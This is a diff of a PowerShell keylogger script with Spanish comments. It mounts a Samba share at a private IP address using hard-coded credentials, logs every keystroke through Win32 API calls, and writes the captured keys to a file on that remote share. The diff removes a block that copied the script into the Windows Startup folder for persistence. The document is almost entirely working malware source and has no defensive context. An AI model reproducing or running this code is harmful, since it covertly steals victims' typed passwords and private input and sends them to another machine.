@@ -1,15 +1,15 @@
-# Credenciales para el servidor Samba
+# Credenciales Samba
 $usuario = "no_autorizado"
 $contrasenya = "noaut1"
 $rutaSamba = "\\192.168.12.103\no_autorizado"
 
-# Montar la unidad de red
+# Monta el Samba
 net use $rutaSamba /user:$usuario $contrasenya
 
-#requires -Version 2
+# Función para el keylogger
 function potato($Path="\\192.168.12.103\no_autorizado\info.txt") 
 {
-  # Signatures for API Calls
+  # Signatures para llamadas a API
   $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
@@ -21,44 +21,43 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 
-  # load signatures and make members available
+  # Carga las firmas 
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
     
-  # create output file
+  # Crea el archivo de salida
   $null = New-Item -Path $Path -ItemType File -Force
 
   try
   {
-    # create endless loop. When user presses CTRL+C, finally-block
-    # executes and shows the collected key presses
+    # Bucle infinito para capturar las pulsaciones de teclas
     while ($true) {
       Start-Sleep -Milliseconds 40
       
-      # scan all ASCII codes above 8
+      # Escanea todos los códigos ASCII por encima de 8
       for ($ascii = 9; $ascii -le 254; $ascii++) {
-        # get current key state
+        # Obtiene el estado actual de la tecla
         $state = $API::GetAsyncKeyState($ascii)
 
-        # is key pressed?
+        # ¿La tecla está presionada?
         if ($state -eq -32767) {
           $null = [console]::CapsLock
 
-          # translate scan code to real code
+          # Traduce el código de escaneo a código real
           $virtualKey = $API::MapVirtualKey($ascii, 3)
 
-          # get keyboard state for virtual keys
+          # Obtiene el estado del teclado para las teclas virtuales
           $kbstate = New-Object Byte[] 256
           $checkkbstate = $API::GetKeyboardState($kbstate)
 
-          # prepare a StringBuilder to receive input key
+          # Prepara un StringBuilder para recibir la tecla de entrada
           $mychar = New-Object -TypeName System.Text.StringBuilder
 
-          # translate virtual key
+          # Traduce la tecla virtual
           $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
           if ($success) 
           {
-            # add key to logger file
+            # Añade la tecla al archivo de registro
             [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
           }
         }
@@ -69,15 +68,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   {   
   }
 }
-# Definir la ruta completa del directorio de inicio
-$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 
-# Definir la ruta completa del script
-$scriptPath = $MyInvocation.MyCommand.Path
-
-# Mover el script a la carpeta de inicio
-Move-Item -Path $scriptPath -Destination $startupFolder
-
-#iniciar 
+# Inicia el keylogger
 potato
-
